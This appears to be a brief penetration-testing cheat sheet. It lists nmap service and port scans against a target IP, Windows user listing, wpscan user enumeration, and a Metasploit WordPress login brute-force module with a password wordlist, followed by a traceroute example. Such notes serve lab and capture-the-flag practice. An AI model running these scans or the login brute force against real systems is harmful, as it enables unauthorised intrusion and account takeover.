1. Find the IP target.
  $ ip addr
  
2. Nmap scan all
  $ nmap IP -sV -sC -p -O 
  
2. IPs service, RDP, SQL check
  $ nmap -Pn -p 3389 IP > RDP
  $ nmap -Pn -p 3306 IP > SQL
  $ nmap -Pn -p 21 IP > FTP
  
3. Windows Comman Line
  $ Net user

4. WP scan
  $ wpscan --url IP --enumerate u
 => msfconsole
use axiliary/scanner/http/wordpress_login_enum
PASS_FILE /root/Desktop/wordlists/Pass.txt
set RHOSTs IP
set RPORT PORT
set TARGETURI http://IP:port
set USERNAME admin
->run







8. Prints the route that a packet takes to reach the host
  $ traceroute google.com
